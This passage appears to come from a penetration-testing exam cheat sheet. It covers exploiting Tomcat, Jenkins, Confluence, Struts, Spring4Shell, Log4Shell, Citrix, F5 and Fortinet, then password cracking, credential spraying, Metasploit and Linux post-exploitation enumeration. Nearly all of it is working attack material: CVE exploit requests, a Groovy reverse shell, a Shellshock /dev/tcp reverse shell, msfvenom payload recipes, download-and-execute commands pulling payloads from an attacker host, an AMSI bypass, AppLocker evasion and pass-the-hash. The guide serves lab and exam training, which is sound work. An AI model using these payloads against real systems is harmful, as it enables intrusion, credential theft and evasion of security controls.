curl -s http://<h>:8080/docs/                    # /docs reveals version
# Default creds — try in order
curl -i -u tomcat:tomcat   http://<h>:8080/manager/html
curl -i -u admin:admin     http://<h>:8080/manager/html
curl -i -u tomcat:s3cret   http://<h>:8080/manager/html
# Brute-force
hydra -L users.txt -P passwords.txt <h> -s 8080 http-get /manager/html

# Deploy WAR shell after creds
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lh> LPORT=4444 -f war > sh.war
curl -u tomcat:<p> --upload-file sh.war "http://<h>:8080/manager/text/deploy?path=/sh"
curl http://<h>:8080/sh/

# Ghostcat (CVE-2020-1938) on AJP port 8009
sudo nmap -p8009 --script ajp-* <h>
python3 ajpShooter.py http://<h>:8080 8009 /WEB-INF/web.xml read

# Tomcat CGI Shellshock — when /cgi/<*.bat|*.sh> accessible:
curl -i -A "() { :;}; echo;/bin/cat /etc/passwd" http://<h>:8080/cgi/<script>.sh
```

##### 13.5 Jenkins

```bash
# Version visible at http://<h>:8080/
# Default creds: admin/admin, jenkins/jenkins
# IF /signup enabled → register
# IF /script accessible → instant Groovy RCE
curl -u admin:admin --data-urlencode "script=def proc='id'.execute(); proc.waitFor(); println proc.in.text" \
  http://<h>:8080/scriptText
```
Reverse shell Groovy payload (paste in Script Console):
```groovy
String host="<lh>";int port=4444;String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
 while(pi.available()>0)so.write(pi.read());
 while(pe.available()>0)so.write(pe.read());
 while(si.available()>0)po.write(si.read());
 so.flush();po.flush();Thread.sleep(50);
 try{p.exitValue();break;}catch(Exception e){}
};p.destroy();s.close();
```

##### 13.6 Splunk

```bash
# Default creds: admin / changeme  OR  admin / SplunkAdmin
# Auth → upload malicious app for RCE
# Build Splunk app with bin/run.py revshell, upload via Settings → Apps
msfconsole -qx "use exploit/multi/http/splunk_upload_app_exec; set RHOSTS <h>; ..."
```

##### 13.7 PRTG Network Monitor

- Default creds: `prtgadmin / prtgadmin` (web 8080/443).
- Authenticated → Notifications → add EXE notification → triggers as SYSTEM.
- CVE-2018-9276: authenticated command injection in Notification.

##### 13.8 osTicket

- Look for sensitive data in attachments / tickets (clients often submit creds).
- Username enum via "forgot password" responses.

##### 13.9 GitLab

```bash
curl -s http://<h>/help | grep -oP 'GitLab \w+ v\K[0-9.]+'
curl -s http://<h>/api/v4/version
# Username enum
curl -s "http://<h>/api/v4/users?username=admin"
# IF signup enabled → register
# CVEs:
# - CVE-2021-22205 (unauth RCE via ExifTool) ≤ 13.10.3
# - CVE-2022-2884 (auth import RCE)
# - CVE-2023-7028 (account takeover via password reset to attacker email)
```

##### 13.10 ColdFusion

```bash
curl -i http://<h>/CFIDE/administrator/index.cfm
# Default admin: admin / admin
# CVE-2010-2861 dir traversal:
curl "http://<h>:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../ColdFusion8/lib/password.properties%00en"
# CVE-2017-3066 — Java deserialization (Flex AMF)
# Once admin → Scheduled Tasks → run a CFM file → RCE
```

##### 13.11 IIS — Tilde (8.3) Enumeration

```bash
python3 IIS_shortname_Scanner.py http://<h>
sudo nmap --script http-iis-short-name-brute -p80 <h>
```

##### 13.12 LDAP Injection (application-level)

- Login bypass payloads:
  ```
  *)(uid=*))(|(uid=*
  *)(&)
  ```
- Boolean extraction: `*)(cn=a*)`, `*)(cn=b*)` — narrow per char.

##### 13.13 Web Mass Assignment

```bash
curl -X PUT http://<h>/api/users/me -H "Content-Type: application/json" \
     -d '{"name":"john","email":"j@x.io","is_admin":true}'
```
- Common vulnerable fields: `role`, `isAdmin`, `is_active`, `verified`, `balance`, `owner`, `tenant_id`.

##### 13.14 Shellshock (CVE-2014-6271) on CGI

```bash
curl -A "() { :;}; echo; echo VULN" http://<h>/cgi-bin/test.sh
curl -A "() { :;}; /bin/bash -i >& /dev/tcp/<lh>/4444 0>&1" http://<h>/cgi-bin/<script>
# Try as User-Agent, Cookie, Referer, Host headers
```

##### 13.15 Thick-Client Applications

```bash
file <binary>
strings -a <binary> | grep -iE 'pass|key|http|sql'
strings -el <binary>                                     # 16-bit unicode
# .NET → dnSpy / ILSpy
# Java → jadx-gui app.jar
# Native → Ghidra / IDA
# Hunt for: hardcoded creds, internal endpoints, hidden URLs, custom protocols
# Then test the back-end API / RPC just like any web target
```

##### 13.16 Confluence

- Detection: `/login.action`, version in page footer or `<meta name="ajs-version-number">`
- **CVE-2022-26134** (unauth OGNL RCE, ≤7.18.0):
  ```bash
  curl -s "http://target:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D/"
  # Or use nuclei: nuclei -u http://target -t CVE-2022-26134
  # PoC: curl -v "http://target:8090//${payload}/"  (URL-encoded OGNL in path)
  ```
- **CVE-2023-22515** (broken access control → create admin account, ≤8.3.2):
  ```bash
  curl -s -X POST http://target:8090/setup/setupadministrator.action \
    -d "username=attacker&fullName=attacker&email=a@b.com&password=P%40ss1&confirm=P%40ss1&setup-next-button=Next"
  ```

##### 13.17 Jira

- Detection: `/login.jsp`, version at `/rest/api/2/serverInfo`
- **CVE-2022-0540** (unauth RCE via WebWork template, Jira ≤8.20.7):
  ```bash
  curl -s "http://target:8080/secure/ContactAdministrators!default.jspa" -H "X-Forwarded-For: 127.0.0.1"
  ```
- **CVE-2019-11581** (SSTI in email template, admin only):
  ```
  Admin → General Config → Send Test Email → Subject: $i18n.getClass().forName('java.lang.Runtime').getMethod('exec',''.class).invoke($i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')
  ```

##### 13.18 Spring Boot Actuator + Spring4Shell

- Detection: `/actuator/`, `/actuator/env`, `/actuator/heapdump`, `/actuator/jolokia`
- **CVE-2022-22965 Spring4Shell** (unauth RCE if Tomcat + JDK 9+):
  ```bash
  curl -X POST "http://target/?" \
    -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B" \
    -d "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \
    -d "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" \
    -d "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcat" \
    -d "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
  # Then: curl "http://target/tomcat.jsp?pwd=j&cmd=id"
  ```
- Actuator env → overwrite `spring.datasource.url`, `logging.config` (JNDI → Log4Shell chain)
- `/actuator/heapdump` → strings `heapdump | grep -a password`

##### 13.19 Log4Shell (CVE-2021-44228)

Every Java app is a candidate. Payload triggers in any logged parameter.

- Detection: inject `${jndi:ldap://<collab>/<x>}` in: User-Agent, X-Forwarded-For, Referer, username fields, any API parameter.
  ```bash
  # With interactsh (free Burp Collaborator alternative):
  interactsh-client &   # starts listener, gives you a URL
  curl -H "User-Agent: \${jndi:ldap://<your-interactsh-url>/x}" http://target/
  curl -H "X-Forwarded-For: \${jndi:ldap://<your-url>/x}" http://target/
  ```
- RCE via marshalsec LDAP redirect → JNDI classload:
  ```bash
  # 1) Prepare payload class (Java reverse shell compiled)
  # 2) marshalsec LDAP server points to your HTTP hosting the .class
  java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://<attacker>:8888/#Exploit"
  python3 -m http.server 8888    # serve Exploit.class
  # 3) Inject jndi payload → target loads class → RCE
  ```
- Bypass filters: `${${lower:j}ndi:...}`, `${${::-j}${::-n}${::-d}${::-i}:...}`

##### 13.20 ManageEngine

- Products: ServiceDesk Plus, ADManager Plus, OpManager, ADAudit Plus
- Detection: default port 8080/8443, `/webclient/` path, version in footer
- Common CVEs: CVE-2022-47966 (SAML unauth RCE), CVE-2021-44515 (unauth RCE)
  ```bash
  nuclei -u http://target:8080 -t manageengine/
  searchsploit "ManageEngine ServiceDesk"
  ```
- Default creds: `admin:admin`

##### 13.21 VMware vCenter / ESXi

- Detection: `https://target/ui/` (vCenter), `https://target/` (ESXi web UI)
- **CVE-2021-21972** (unauth RCE via vROPS endpoint, vCenter 7.0 U1c and earlier):
  ```bash
  curl -k -X POST "https://target/ui/vropspluginui/rest/services/uploadova" \
    -F "uploadFile=@shell.tar" -H "Content-Type: multipart/form-data"
  # shell.tar contains JSP webshell at correct path
  ```
- ESXi ransomware path: `scp` ESXi shell script if SSH enabled, or SOAP API if auth weak

##### 13.22 Citrix ADC / NetScaler (CVE-2019-19781, CVE-2023-3519)

- Detection: `/vpn/../vpns/cfg/smb.conf` → directory traversal response
- **CVE-2019-19781** (path traversal + RCE, unauth):
  ```bash
  curl -sk "https://target/vpn/../vpns/cfg/smb.conf"     # confirm vuln
  # Then: perl citrix-rce.pl --target https://target --payload "id"
  ```
- **CVE-2023-3519** (unauth RCE via HTTP request smuggling):
  ```bash
  nuclei -u https://target -t CVE-2023-3519
  ```

##### 13.23 F5 BIG-IP

- Detection: `/tmui/login.jsp`, `/mgmt/shared/authn/login`
- **CVE-2020-5902** (unauth RCE via TMUI, BIG-IP 11.6-15.x):
  ```bash
  curl -sk "https://target/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
  curl -sk -X POST "https://target/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp" -d "command=list+auth+user+admin"
  ```
- **CVE-2022-1388** (unauth REST API bypass):
  ```bash
  curl -sk -u "admin:" -H "X-F5-Auth-Token: " -H "Connection: X-F5-Auth-Token" \
    "https://target/mgmt/tm/util/bash" -d '{"command":"run","utilCmdArgs":"-c id"}'
  ```

##### 13.24 Fortinet FortiOS / FortiGate (CVE-2022-40684)

- Detection: HTTPS management UI, `FortiOS` in Server header
- **CVE-2022-40684** (unauth admin bypass, FortiOS 7.0.0-7.0.6, 7.2.0-7.2.1):
  ```bash
  curl -sk -X PUT "https://target/api/v2/cmdb/system/admin/admin" \
    -H "User-Agent: Report Runner" -H "Forwarded: by=\"[127.0.0.1]\";for=\"[127.0.0.1]\"" \
    -d '{"ssh-public-key1":"ssh-rsa AAAA..."}'
  # → SSH as admin with your key
  ```

##### 13.25 PaperCut (CVE-2023-27350)

- Detection: PaperCut NG/MF on port 9191/9192, `/app?service=direct/0/Home` path
- **CVE-2023-27350** (unauth RCE, PaperCut ≤22.0.4):
  ```bash
  # PoC: POST to /app?service=direct/0/Home&sp=SLoginPanel&sp=Submit
  # with setupRequired=true bypasses auth → enable script execution in print scripting
  python3 papercut-rce.py http://target:9191 <attacker-ip> <attacker-port>
  ```

##### 13.26 SharePoint

- Detection: `/_layouts/15/` path, `X-SharePointHealthScore` header
- **CVE-2019-0604** (unauth RCE via deserialization, SharePoint 2010-2019):
  ```bash
  searchsploit sharepoint 2019
  # Use ysoserial.net payload delivered via the vulnerable SOAP endpoint
  ```
- **CVE-2023-29357** (unauth privilege escalation → admin → RCE chain):
  ```bash
  nuclei -u http://target -t CVE-2023-29357
  ```

##### 13.27 Apache Struts (S2-series OGNL Injection)

- Detection: `.action` / `.do` URLs, `Struts2` in HTTP response
- **S2-045** (multipart Content-Type OGNL, ≤2.3.32):
  ```bash
  curl -X POST "http://target/index.action" \
    -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
    -F "test=test"
  ```

---

### 4.2 Service Exploitation

- IF SSH + creds:
  ```bash
  ssh -o StrictHostKeyChecking=no <user>@<ip>
  ```
- IF SSH + key:
  ```bash
  chmod 600 id_rsa
  ssh -i id_rsa -o IdentitiesOnly=yes <user>@<ip>
  # If key is encrypted: ssh2john id_rsa > h && john --wordlist=rockyou.txt h
  ```

- IF SMB + creds — choose by scenario:
  | Tool | Auth | Output | Stealth | Use when |
  | ---- | ---- | ------ | ------- | -------- |
  | `psexec.py` | Local Admin | SYSTEM shell | Drops a service binary; loud | You need SYSTEM, AV is permissive |
  | `smbexec.py` | Local Admin | semi-interactive | No binary on disk; uses `cmd.exe /Q /c` via service | psexec is caught by AV |
  | `wmiexec.py` | Local Admin | semi-interactive | No service, uses WMI; quietest | Defender on, want least artifacts |
  | `atexec.py` | Local Admin | command output only | Schedules a task | Other methods blocked |
  | `evil-winrm` | WinRM (admin or user in `Remote Management Users`) | Full PS shell | Cleanest if WinRM open | 5985 open, you have creds |
  ```bash
  impacket-psexec  <dom>/<u>:'<p>'@<ip>
  impacket-smbexec <dom>/<u>:'<p>'@<ip>
  impacket-wmiexec <dom>/<u>:'<p>'@<ip>
  impacket-atexec  <dom>/<u>:'<p>'@<ip> 'whoami'
  evil-winrm -i <ip> -u <u> -p '<p>'
  ```
- IF SMB + NT hash (Pass-the-Hash):
  ```bash
  impacket-psexec  <dom>/<u>@<ip>  -hashes :<NTLM>
  impacket-wmiexec <dom>/<u>@<ip>  -hashes :<NTLM>
  evil-winrm -i <ip> -u <u> -H <NTLM>
  nxc smb <ip> -u <u> -H <NTLM>
  ```

- IF MSSQL — see §2.2 → enable xp_cmdshell or abuse linked servers.

- IF outdated service with public exploit:
  ```bash
  searchsploit <product> <version>
  searchsploit -m <id>
  # Read the script header — note compile flags, target arch
  cat 12345.py | head -40
  # Try Metasploit equivalent first
  msfconsole -qx "search type:exploit <product> <version>"
  ```
  Decision: Metasploit module if available and reliable; manual exploit if MSF fails or the path is unique.

- IF anonymous FTP/SMB/NFS:
  ```bash
  wget -mr --user=anonymous --password='' ftp://<ip>/
  smbclient -N //<ip>/<share> -c 'recurse;prompt;mget *'
  showmount -e <ip> && sudo mount -t nfs <ip>:/<share> /mnt/nfs
  ```

### 4.3 Password Attacks

#### Hash workflow

- Identify hash:
  ```bash
  hashid '<hash>'
  hash-identifier
  hashcat --example-hashes | grep -B1 '<sample>'        # confirm mode
  ```
- Common modes (memorise these):
  | Mode | Hash type |
  | --- | --- |
  | 0 | MD5 |
  | 100 | SHA1 |
  | 1400 | SHA256 |
  | 1800 | sha512crypt ($6$) — Linux /etc/shadow |
  | 500 | md5crypt ($1$) |
  | 3200 | bcrypt |
  | 1000 | NTLM |
  | 1100 | DCC1 |
  | 2100 | DCC2 (mscash2) |
  | 5500 | NetNTLMv1 |
  | 5600 | NetNTLMv2 |
  | 13100 | Kerberos TGS-REP (Kerberoast) |
  | 18200 | Kerberos AS-REP (AS-REP roast) |
  | 19600 | Kerberos TGS-REP AES128 |
  | 19700 | Kerberos TGS-REP AES256 |
  | 9600 | Office 2013 |
  | 11600 | 7-Zip |
  | 13400 | KeePass |
  | 22921 | RSA private key (encrypted) |

- Crack:
  ```bash
  hashcat -m <mode> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
  hashcat -m <mode> -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
  hashcat -m <mode> -a 0 hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule  # heavy, when standard fails
  hashcat -m <mode> -a 3 hashes.txt ?u?l?l?l?l?l?d?d                          # mask attack
  hashcat -m <mode> -a 6 hashes.txt rockyou.txt ?d?d?d                        # hybrid: word + 3 digits
  hashcat --show -m <mode> hashes.txt                                         # view cracked
  john --format=<fmt> --wordlist=rockyou.txt hashes.txt
  john --show hashes.txt
  ```
- Custom wordlist with **CeWL**:
  ```bash
  cewl -d 3 -m 5 -w cewl.txt https://<host>/
  hashcat -m <mode> hashes.txt cewl.txt -r best64.rule
  ```
- Targeted variations (`mp64.bin`/maskprocessor or `hashcat -a 7`):
  ```bash
  # Append company name + season + year
  hashcat -m <mode> hashes.txt rockyou.txt -r ./rules/append-2024-2025.rule
  ```

#### "Got a Hash" — What to do next

```
HASH DECISION TREE:

├── Identify first: hashid '<hash>' or hashcat --example-hashes | grep -A2 '<sample>'
│
├── NTLM (32-char hex, no prefix) → mode 1000
│   ├── TRY PTH FIRST — no cracking needed
│   │   nxc smb  <cidr> -u <user> -H <NTLM> --continue-on-success
│   │   nxc winrm <cidr> -u <user> -H <NTLM>
│   │   evil-winrm -i <ip> -u <user> -H <NTLM>
│   ├── Crack: hashcat -m 1000 hash.txt rockyou.txt -r best64.rule
│   └── Local admin NTLM → spray ALL machines (RID-500 or LocalAccountTokenFilterPolicy=1)
│
├── NetNTLMv2 ($NTLMSSPv2$...) → mode 5600
│   ├── CANNOT PTH — must crack first
│   ├── hashcat -m 5600 hash.txt rockyou.txt -r best64.rule
│   └── Cracked → go to "Got Creds" tree below
│
├── NetNTLMv1 ($NL$...) → mode 5500
│   ├── Crack or use crack.sh rainbow tables
│   └── If NTLMv1 still negotiated → relay or downgrade
│
├── Kerberos TGS ($krb5tgs$23$...) → mode 13100
│   ├── hashcat -m 13100 hash.txt rockyou.txt -r best64.rule
│   └── Cracked → service account creds → "Got Creds" tree
│
├── Kerberos TGS AES ($krb5tgs$18$...) → mode 19700
│   └── hashcat -m 19700 hash.txt rockyou.txt (slower — AES256)
│
├── Kerberos AS-REP ($krb5asrep$23$...) → mode 18200
│   ├── hashcat -m 18200 hash.txt rockyou.txt -r best64.rule
│   └── Cracked → domain user → "Got Creds" tree + full AD enum loop
│
├── /etc/shadow sha512crypt ($6$...) → mode 1800
│   ├── hashcat -m 1800 hash.txt rockyou.txt
│   └── Cracked → test SSH, sudo, su, other users (password reuse)
│
└── Unknown → hashid + check section 3.3 hash mode table above
```

> 🔄 **LOOP**: Hash cracked → go to "Got Creds" tree → spray ALL services on ALL discovered hosts

#### "Got Creds" — Where to spray

```
CRED SPRAY DECISION TREE

FIRST: Get lockout policy (never lock accounts):
  nxc smb <dc-ip> -u <u> -p '<p>' --pass-pol
  → If lockout threshold > 0, spray max (threshold - 2) attempts per 30 min window

SPRAY ORDER (use --continue-on-success, stop per service when you have what you need):
  1. SMB     nxc smb   <cidr> -u users.txt -p '<pass>' --continue-on-success
  2. WinRM   nxc winrm <cidr> -u <u> -p '<p>'
  3. RDP     nxc rdp   <cidr> -u <u> -p '<p>'
  4. SSH     nxc ssh   <cidr> -u <u> -p '<p>'
  5. MSSQL   nxc mssql <cidr> -u <u> -p '<p>'
  6. FTP     nxc ftp   <cidr> -u <u> -p '<p>'
  7. LDAP    nxc ldap  <dc-ip> -u <u> -p '<p>' --users --groups

Hash spray (PTH — no lockout risk for NTLM PTH):
  nxc smb <cidr> -u <u> -H <NTLM> --continue-on-success
```

> 🔄 **LOOP**: Spray hits new host → go to §5 (Linux post-ex) or §6 (Windows post-ex) on that host
> 🔄 **LOOP**: New domain user creds → return to §7.1 AD Enumeration with those creds
> 🔄 **LOOP**: Creds work on DC → re-run BloodHound, re-run Kerberoast/AS-REP with new context

#### Login form / service brute-force

- IF web login form:
  ```bash
  # Get the POST params from Burp first
  hydra -L users.txt -P passwords.txt <host> http-post-form \
        '/login.php:user=^USER^&pass=^PASS^:F=incorrect' -t 16

  # FFuf alternative
  ffuf -u http://<host>/login.php -X POST \
       -d 'user=admin&pass=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' \
       -w rockyou.txt -fr 'incorrect'
  ```

- IF basic auth:
  ```bash
  hydra -L users.txt -P passwords.txt <host> http-get / -s <port>
  ```

- IF SSH:
  ```bash
  hydra -L users.txt -P passwords.txt ssh://<ip> -t 4
  ```

- IF SMB (use `nxc`, never hydra — locks accounts):
  ```bash
  nxc smb <ip> -u users.txt -p passwords.txt --continue-on-success
  ```

- IF RDP:
  ```bash
  hydra -L users.txt -P passwords.txt rdp://<ip> -t 1
  ```

- IF WinRM:
  ```bash
  nxc winrm <ip> -u users.txt -p passwords.txt
  ```

- IF FTP:
  ```bash
  hydra -L users.txt -P passwords.txt ftp://<ip>
  ```

#### Kerberos attacks

- AS-REP Roast (no auth needed if you have a username list):
  ```bash
  impacket-GetNPUsers <dom>/ -no-pass -usersfile users.txt -dc-ip <dc> -format hashcat -outputfile asrep.hash
  impacket-GetNPUsers <dom>/<user>:'<pass>' -request -dc-ip <dc> -format hashcat -outputfile asrep.hash
  hashcat -m 18200 asrep.hash rockyou.txt -r best64.rule
  ```
- Kerberoast (need any domain creds):
  ```bash
  impacket-GetUserSPNs <dom>/<user>:'<pass>' -dc-ip <dc> -request -outputfile kerb.hash
  hashcat -m 13100 kerb.hash rockyou.txt -r best64.rule
  ```
- Pre-auth bruteforce / username enum (no creds):
  ```bash
  kerbrute userenum -d <dom> --dc <dc> users.txt
  kerbrute passwordspray -d <dom> --dc <dc> users.txt 'Welcome2025'
  ```

#### NTLM hash → Pass-the-Hash matrix

| Service | Tool |
| --- | --- |
| SMB | `impacket-psexec/wmiexec/smbexec`, `nxc smb -H` |
| WinRM | `evil-winrm -H`, `nxc winrm -H` |
| RDP (RestrictedAdmin) | `xfreerdp /pth:<NTLM>` |
| LDAP | `ldapsearch -Y GSSAPI` (after Overpass), or `bloodhound-python --hashes` |
| MSSQL | `mssqlclient.py -hashes :<NTLM>` |

#### Credential reuse (the "matrix" you must always run after finding any creds)

```bash
for svc in smb winrm ssh rdp ftp mssql ldap; do
  nxc $svc <cidr> -u <user> -p '<pass>' --continue-on-success 2>/dev/null | grep -E '\[\+\]'
done
```
Run this against **every host** every time you find a new credential.

> 🔄 **LOOP — New credential found**: IMMEDIATELY run the matrix above across ALL discovered hosts before continuing.
> → Add to `~/exam/creds/credentials.txt`
> → If new AD user: `nxc ldap <dc-ip> -u <u> -p '<p>' --users --groups` + BloodHound re-collect

#### Wordlist & rule selection

- Default wordlists (in priority):
  1. `/usr/share/wordlists/rockyou.txt` — first try always
  2. `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt`
  3. `cewl.txt` (built from the target site)
  4. Targeted: company-name + season/year variants
- Default rules:
  1. `best64.rule` — 99% of exam crackable hashes
  2. `T0XlC.rule` / `dive.rule` — moderate
  3. `OneRuleToRuleThemAll.rule` — heavy, save for hard hashes


### 4.4 Metasploit Framework

#### 4.4.1 Boot & search

```bash
sudo systemctl start postgresql
msfdb init
msfconsole -q
msf6> db_status
msf6> workspace -a exam-2025
msf6> db_nmap -sV -p- 10.10.10.0/24                # auto-imports
msf6> hosts; services; vulns
msf6> search type:exploit ms17-010
```

#### 4.4.2 Module workflow

```text
use exploit/windows/smb/ms17_010_eternalblue
info                                 # read description
info -d                              # full documentation (pulls from module DB)
options                              # show RHOSTS, LHOST, etc.

# RHOSTS — multi-host syntax:
set RHOSTS 10.10.10.5                           # single IP
set RHOSTS 10.10.10.0/24                        # CIDR range
set RHOSTS 10.10.10.5,10.10.10.7,10.10.10.10   # comma-separated
set RHOSTS file:/path/to/targets.txt            # file with one IP/host per line

# Global variables (persist across modules):
setg LHOST tun0
setg LPORT 4444
save                                 # write global vars to disk (survive msfconsole restart)

set PAYLOAD windows/x64/meterpreter/reverse_https
set LPORT 443
check                                # safety check
exploit -j                           # background as a job
sessions -l
sessions -i 1

# Custom modules:
loadpath /opt/custom-modules/        # load dir of custom .rb modules

# Manual routing through a session (alternative to run autoroute):
route add 10.10.10.0/24 1           # route subnet through session 1
route print
```

#### 4.4.3 Common payloads

| Payload | When |
| --- | --- |
| `windows/x64/meterpreter/reverse_https` | best stealth on outbound 443 |
| `windows/x64/meterpreter/reverse_tcp` | simple, common |
| `linux/x64/meterpreter/reverse_tcp` | Linux meterpreter |
| `cmd/unix/reverse_bash` | minimalist, bash-only |
| `python/meterpreter/reverse_tcp` | Linux, Python only |
| `windows/x64/shell_reverse_tcp` | when meterpreter is too noisy |
| `java/jsp_shell_reverse_tcp` | Tomcat WAR |

#### 4.4.4 msfvenom recipes

```bash
# Windows EXE
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lh> LPORT=443 -f exe -o sh.exe
# Windows DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lh> LPORT=4444 -f dll -o sh.dll
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lh> LPORT=4444 -f elf -o sh
# PowerShell base64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lh> LPORT=4444 -f psh-cmd -o sh.cmd
# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lh> LPORT=4444 -f aspx -o sh.aspx
# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lh> LPORT=4444 -f war -o sh.war
# Stageless (one-shot, larger but no second connection)
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<lh> LPORT=443 -f exe -o sh.exe
# Encoded — x86 (shikata_ga_nai, most iterations = more evasion, larger file)
msfvenom -p windows/x86/shell_reverse_tcp LHOST=<lh> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o sh.exe
# Encoded — x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lh> LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o sh.exe
# Fileless — IEX DownloadString (no disk write)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lh> LPORT=443 -f psh -o payload.ps1
# Then: iex (iwr http://<lh>/payload.ps1 -UseBasicParsing).Content
```

#### AV / AMSI Evasion Quick-Reference

```powershell
# AMSI bypass (run before any offensive PS import)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Bypass PS execution policy
powershell -ep bypass -c "<command>"
powershell -exec bypass -enc <base64-command>

# AppLocker bypass (write to allowed paths)
# Allowed by default: C:\Windows\Temp\, C:\Windows\System32\spool\drivers\color\
copy payload.exe C:\Windows\System32\spool\drivers\color\payload.exe

# PS v2 downgrade (bypasses AMSI/ScriptBlock logging on old systems)
powershell -Version 2 -c "<command>"

# LOLBAS alternatives when exe blocked (no disk):
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell");h.run("calc");
regsvr32 /s /n /u /i:http://<lh>/payload.sct scrobj.dll
mshta http://<lh>/payload.hta
```

#### 4.4.5 Multi/handler

```text
use exploit/multi/handler
set PAYLOAD <same payload as msfvenom>
set LHOST tun0
set LPORT 443
set ExitOnSession false
exploit -j
```

#### 4.4.6 Meterpreter post-ex

```text
sysinfo                          # OS, arch
getuid                           # current user
getsystem                        # try LSA / SeImpersonate / KiTrap0D
hashdump                         # local SAM (need SYSTEM)
load kiwi                        # mimikatz module
kiwi> creds_all
load incognito                   # token impersonation
list_tokens -u
impersonate_token "DOMAIN\\admin"
ps                                # processes
migrate <pid>                    # move into another process
shell                             # native shell
download / upload                # file transfer
portfwd add -l 1234 -p 3389 -r 10.10.10.5     # forward through session
run autoroute -s 10.10.10.0/24                # add route through session
run post/multi/recon/local_exploit_suggester  # next-step ideas
```

#### 4.4.7 Pivoting via Metasploit (full)

```text
sessions -i 1
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background
msf6> use auxiliary/server/socks_proxy
msf6> set SRVPORT 1080 ; set VERSION 5
msf6> run -j
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn 10.10.10.5
```

---

> ✅ **GATE — Before §5/§6 (Post-Exploitation)**: Must have:
> - [ ] Stable shell (TTY upgraded if Linux; PowerShell prompt if Windows)
> - [ ] Initial enum run: `id`/`whoami /all`, `hostname`, `ip a`/`ipconfig /all`, `ps`/`tasklist`
> - [ ] Network footprint: `ip r`/`route print`, `arp -a`
> - [ ] Foothold credentials saved to `creds/credentials.txt`
> - [ ] Screenshot with IP/hostname visible in prompt taken

---

## 5. Post-Exploitation — Linux

> 🔄 **LOOP — Shell obtained on new Linux host**: You are now at §5. After completing §5, check network: `ip a; ip r; arp -a`. New subnet found → §9 pivot setup → return to §2 recon on new segment.

### 5.1 Situational Awareness

```bash
# User context & privileges
id; whoami; groups
sudo -l                                     # CRITICAL — first thing every shell
cat /etc/passwd /etc/shadow 2>/dev/null
cat /etc/group

# System
hostname; hostnamectl
uname -a
cat /etc/os-release
cat /etc/issue
arch

# Network
ip a; ip r; ss -tunlp; netstat -plant
cat /etc/resolv.conf /etc/hosts /etc/networks
arp -a

# Processes
ps auxf
ps -ef --forest
systemctl list-units --type=service --state=running

# SUID / SGID / capabilities
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
find / -perm -4000 -ls 2>/dev/null
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/ 2>/dev/null
systemctl list-timers --all

# Writable paths
find / -writable -type d 2>/dev/null | grep -v proc
find / \( -perm -o+w -o -perm -g+w \) -type f 2>/dev/null | grep -v proc

# Mounts / disks
mount; df -h; cat /etc/fstab

# Software / kernel
dpkg -l 2>/dev/null || rpm -qa 2>/dev/null
uname -r

# Env / history
env; printenv
cat ~/.bash_history /home/*/.bash_history 2>/dev/null
cat ~/.bashrc ~/.profile ~/.zshrc 2>/dev/null
```

### 5.2 Privilege Escalation

#### Decision tree

```
